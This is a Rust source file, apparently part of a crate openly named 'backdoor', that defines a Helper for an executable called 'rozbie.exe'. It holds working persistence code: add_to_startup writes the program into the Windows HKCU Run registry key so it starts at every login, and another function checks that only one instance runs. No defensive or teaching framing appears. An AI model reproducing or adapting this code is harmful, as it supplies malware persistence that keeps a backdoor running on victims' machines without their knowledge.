use std::{env, path::Path};
use sysinfo::SystemExt;

const BACKDOOR_APP_NAME: &'static str = "rozbie.exe";

pub struct Helper
{
}

impl Helper
{
    pub fn new() -> Helper
    {
        Helper
        {
        }
    }

    /// Add this application to the Windows startup
    /// # Returns
    /// * `Result<(), String>` - Result of the operation
    /// # Example
    /// ```
    /// use backdoor::helper::Helper;
    /// 
    /// let helper = Helper::new();
    /// 
    /// match helper.add_to_startup()
    /// {
    ///    Ok(_) => println!("Added to startup"),
    ///   Err(e) => println!("Failed to add to startup: {}", e)
    /// }
    /// ```
    /// # Errors
    /// This function will return an error if it fails to open the registry key
    /// or if it fails to set the registry value
    /// # Panics
    /// This function will panic if it fails to get the current directory
    pub fn add_to_startup(&self) -> Result<(), String>
    {
        use winreg::enums::*;

        let regkey = match winreg::RegKey::predef(HKEY_CURRENT_USER)
            .open_subkey_with_flags(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", KEY_WRITE | KEY_READ)
        {
            Ok(x) => x,
            Err(e) => 
            {
                return Err(format!("Failed to open registry key: {}", e))
            }
        };

        //check if the key already exists
        let value = regkey.get_value("rozbie").unwrap_or("".to_string());

        if !value.is_empty()
        {
            return Ok(())
        }

        let current_dir = self.get_current_directory();
        let current_dir = format!("\"{}\\{}\"", current_dir, BACKDOOR_APP_NAME);

        match regkey.set_value("rozbie", &current_dir)
        {
            Ok(_) => (),
            Err(e) => 
            {
                return Err(format!("Failed to set registry value: {}", e))
            }
        }

        Ok(())
    }

    /// Get the current directory
    /// # Returns
    /// * `String` - The current directory
    /// # Panics
    /// This function will panic if it fails to get the current directory
    /// # Example
    /// ```
    /// use backdoor::helper::Helper;
    /// 
    /// let helper = Helper::new();
    /// 
    /// let current_dir = helper.get_current_directory();
    /// println!("Current directory: {}", current_dir);
    /// ```
    /// # Errors
    /// This function will return an error if it fails to get the current directory
    fn get_current_directory(&self) -> String
    {
        let binding = env::current_dir().unwrap();
        let current_dir = Path::new(binding.to_str().unwrap());
        current_dir.to_str().unwrap().to_string()
    }

    /// Check if this process already exists in the Widnows OS
    /// # Returns
    /// * `bool` - True if the process exists, false otherwise
    pub fn check_if_process_exists(&self) -> bool
    {
        let s = sysinfo::System::new_all();
        let mut exists = false;

        let it = s.processes_by_name(BACKDOOR_APP_NAME);
        
        let mut count = 0;
        
        for _ in it
        {
            count += 1;
        }

        if count > 1
        {
            exists = true;
        }

        exists
    }
}